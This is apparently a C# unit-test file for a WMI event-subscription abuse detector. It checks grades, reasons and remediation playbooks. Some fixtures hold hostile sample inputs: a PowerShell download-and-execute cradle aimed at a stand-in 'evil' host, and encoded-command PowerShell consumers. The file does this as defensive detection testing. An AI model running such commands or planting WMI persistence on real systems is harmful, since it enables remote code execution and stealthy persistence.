using System.Text.Json;
using WinSentinel.Core.Services;
using static WinSentinel.Core.Services.WmiSubscriptionAbuseAdvisor;

namespace WinSentinel.Tests;

public class WmiSubscriptionAbuseAdvisorTests
{
    private static readonly DateTime Now = new DateTime(2026, 5, 22, 17, 0, 0, DateTimeKind.Utc);

    private static AdvisorContext Ctx(
        RiskAppetite risk = RiskAppetite.Balanced,
        int recentHours = 72,
        int staleDays = 180,
        int tightPollSecs = 60) =>
        new AdvisorContext
        {
            Risk = risk,
            NowOverride = Now,
            RecentRegistrationHours = recentHours,
            StaleDays = staleDays,
            TightPollingThresholdSeconds = tightPollSecs,
        };

    private static WmiSubscriptionSnapshot Make(
        string filter = "FltrA",
        string consumer = "ConsA",
        ConsumerType kind = ConsumerType.LogFile,
        SubscriptionPrincipal principal = SubscriptionPrincipal.User,
        string ns = "root\\subscription",
        string? query = "SELECT * FROM __InstanceModificationEvent WITHIN 300",
        string? cmd = null,
        string? script = null,
        bool hashKnown = true,
        bool signatureValid = true,
        bool aclWeakened = false,
        bool builtIn = false,
        bool enabled = true,
        DateTime? registeredAt = null,
        DateTime? lastTriggeredAt = null,
        string? registeredBy = "NT AUTHORITY\\SYSTEM")
    {
        return new WmiSubscriptionSnapshot(
            FilterName: filter,
            ConsumerName: consumer,
            ConsumerKind: kind,
            Principal: principal,
            Namespace: ns,
            QueryLanguage: "WQL",
            Query: query,
            ConsumerCommandLine: cmd,
            ConsumerScriptText: script,
            BinaryHashKnown: hashKnown,
            BinarySignatureValid: signatureValid,
            AclWeakened: aclWeakened,
            BuiltInSubscription: builtIn,
            Enabled: enabled,
            RegisteredAt: registeredAt,
            LastTriggeredAt: lastTriggeredAt,
            RegisteredBy: registeredBy);
    }

    [Fact]
    public void Empty_input_returns_grade_A_with_p3_fallback()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var r = a.Analyze(Array.Empty<WmiSubscriptionSnapshot>(), Ctx());

        Assert.Equal(0, r.TotalSubscriptions);
        Assert.Equal("A", r.Grade);
        Assert.Equal("NO_DATA", r.Verdict);
        Assert.Single(r.Playbook);
        Assert.Equal("ALL_SUBSCRIPTIONS_HEALTHY", r.Playbook[0].Id);
        Assert.Equal(ActionPriority.P3, r.Playbook[0].Priority);
    }

    [Fact]
    public void Active_script_consumer_forces_F_and_quarantine_action()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.ActiveScript,
            principal: SubscriptionPrincipal.System,
            script: "var x = 1;");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Equal("F", r.Grade);
        Assert.Equal("WMI_PERSISTENCE_ABUSE_SUSPECTED", r.Verdict);
        Assert.Equal(1, r.QuarantineCount);
        Assert.Contains("ACTIVE_SCRIPT_CONSUMER", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "QUARANTINE_ACTIVE_SCRIPT_CONSUMERS" && p.Priority == ActionPriority.P0);
    }

    [Fact]
    public void Lolbin_commandline_consumer_with_encoded_powershell_forces_F()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.CommandLine,
            principal: SubscriptionPrincipal.System,
            cmd: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -EncodedCommand SQBFAFgAIA==");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Equal("F", r.Grade);
        Assert.Contains("LOLBIN_CONSUMER", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "DISABLE_LOLBIN_CONSUMERS" && p.Priority == ActionPriority.P0);
    }

    [Fact]
    public void Suspicious_script_content_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.ActiveScript,
            principal: SubscriptionPrincipal.System,
            script: "IEX((New-Object Net.WebClient).DownloadString('http://evil/x.ps1'))");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("ACTIVE_SCRIPT_CONSUMER", r.Assessments[0].Reasons);
        Assert.Contains("SUSPICIOUS_SCRIPT_CONTENT", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "EXTRACT_AND_REVERSE_SCRIPT_PAYLOADS");
    }

    [Fact]
    public void Tight_polling_interval_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.LogFile,
            query: "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("TIGHT_POLLING_INTERVAL", r.Assessments[0].Reasons);
    }

    [Fact]
    public void Non_default_namespace_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(ns: "root\\evil");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("NON_DEFAULT_NAMESPACE", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "INVESTIGATE_UNUSUAL_NAMESPACES");
    }

    [Fact]
    public void Recent_unauthorized_registration_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            principal: SubscriptionPrincipal.Administrators,
            registeredAt: Now.AddHours(-1),
            registeredBy: "DOMAIN\\joeuser");
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("RECENT_UNAUTHORIZED_REGISTRATION", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "REVIEW_RECENT_UNAUTHORIZED_REGISTRATIONS");
    }

    [Fact]
    public void Unknown_registrar_flagged_when_recent_and_empty()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            registeredAt: Now.AddHours(-2),
            registeredBy: null);
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("UNKNOWN_REGISTRAR", r.Assessments[0].Reasons);
    }

    [Fact]
    public void Stale_high_privilege_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            principal: SubscriptionPrincipal.System,
            lastTriggeredAt: Now.AddDays(-365));
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("STALE_HIGH_PRIVILEGE", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "RETIRE_STALE_PRIVILEGED_SUBSCRIPTIONS");
    }

    [Fact]
    public void Acl_weakened_flagged()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(principal: SubscriptionPrincipal.System, aclWeakened: true);
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Contains("ACL_WEAKENED", r.Assessments[0].Reasons);
        Assert.Contains(r.Playbook, p => p.Id == "RESTORE_SUBSCRIPTION_ACLS");
    }

    [Fact]
    public void Healthy_builtin_subscription_grades_A()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(builtIn: true, principal: SubscriptionPrincipal.System);
        var r = a.Analyze(new[] { s }, Ctx());

        Assert.Equal("A", r.Grade);
        Assert.Equal(SubscriptionVerdict.Healthy, r.Assessments[0].Verdict);
        Assert.Contains("HEALTHY", r.Assessments[0].Reasons);
    }

    [Fact]
    public void Cautious_appends_calibration_audit_at_grade_F()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.ActiveScript,
            principal: SubscriptionPrincipal.System);
        var r = a.Analyze(new[] { s }, Ctx(risk: RiskAppetite.Cautious));

        Assert.Equal("F", r.Grade);
        Assert.Contains(r.Playbook, p => p.Id == "SCHEDULE_WMI_SUBSCRIPTION_AUDIT");
    }

    [Fact]
    public void Aggressive_trims_p3_fallback_when_actionable_items_exist()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var bad = Make(
            kind: ConsumerType.CommandLine,
            principal: SubscriptionPrincipal.System,
            cmd: @"C:\Windows\System32\powershell.exe -EncodedCommand AAA");
        var good = Make(filter: "F2", consumer: "C2", builtIn: true);
        var r = a.Analyze(new[] { bad, good }, Ctx(risk: RiskAppetite.Aggressive));

        Assert.DoesNotContain(r.Playbook, p => p.Priority == ActionPriority.P3);
    }

    [Fact]
    public void Playbook_is_ordered_by_priority_then_id()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s1 = Make(
            filter: "F1",
            consumer: "C1",
            kind: ConsumerType.ActiveScript,
            principal: SubscriptionPrincipal.System);
        var s2 = Make(
            filter: "F2",
            consumer: "C2",
            principal: SubscriptionPrincipal.System,
            aclWeakened: true);
        var s3 = Make(
            filter: "F3",
            consumer: "C3",
            principal: SubscriptionPrincipal.System,
            lastTriggeredAt: Now.AddDays(-365));
        var r = a.Analyze(new[] { s1, s2, s3 }, Ctx());

        var priorities = r.Playbook.Select(p => (int)p.Priority).ToList();
        var sorted = priorities.OrderBy(x => x).ToList();
        Assert.Equal(sorted, priorities);
    }

    [Fact]
    public void Risk_score_monotonic_in_appetite()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            principal: SubscriptionPrincipal.System,
            aclWeakened: true,
            signatureValid: false,
            cmd: @"C:\Windows\System32\foo.exe");
        var cautious = a.Analyze(new[] { s }, Ctx(risk: RiskAppetite.Cautious));
        var balanced = a.Analyze(new[] { s }, Ctx(risk: RiskAppetite.Balanced));
        var aggressive = a.Analyze(new[] { s }, Ctx(risk: RiskAppetite.Aggressive));

        Assert.True(aggressive.Assessments[0].RiskScore <= balanced.Assessments[0].RiskScore);
        Assert.True(balanced.Assessments[0].RiskScore <= cautious.Assessments[0].RiskScore);
    }

    [Fact]
    public void Json_roundtrips_deterministically()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(
            kind: ConsumerType.CommandLine,
            principal: SubscriptionPrincipal.System,
            cmd: @"C:\Windows\System32\powershell.exe -EncodedCommand AAA");
        var r1 = a.Analyze(new[] { s }, Ctx());
        var r2 = a.Analyze(new[] { s }, Ctx());
        Assert.Equal(a.ToJson(r1), a.ToJson(r2));

        using var doc = JsonDocument.Parse(a.ToJson(r1));
        Assert.Equal("F", doc.RootElement.GetProperty("Grade").GetString());
    }

    [Fact]
    public void Markdown_contains_all_sections()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var s = Make(kind: ConsumerType.ActiveScript, principal: SubscriptionPrincipal.System);
        var r = a.Analyze(new[] { s }, Ctx());
        var md = a.ToMarkdown(r);

        Assert.Contains("# WMI Event Subscription Abuse Report", md);
        Assert.Contains("## Subscriptions", md);
        Assert.Contains("## Playbook", md);
        Assert.Contains("## Insights", md);
    }

    [Fact]
    public void Null_input_throws()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        Assert.Throws<ArgumentNullException>(() => a.Analyze(null!));
    }

    [Fact]
    public void Unauthorized_registration_cluster_insight()
    {
        var a = new WmiSubscriptionAbuseAdvisor();
        var snaps = Enumerable.Range(0, 3).Select(i => Make(
            filter: $"F{i}",
            consumer: $"C{i}",
            principal: SubscriptionPrincipal.Administrators,
            registeredAt: Now.AddHours(-i - 1),
            registeredBy: "DOMAIN\\joeuser")).ToArray();
        var r = a.Analyze(snaps, Ctx());

        Assert.Contains(r.Insights, i => i.StartsWith("UNAUTHORIZED_REGISTRATION_CLUSTER:"));
    }
}
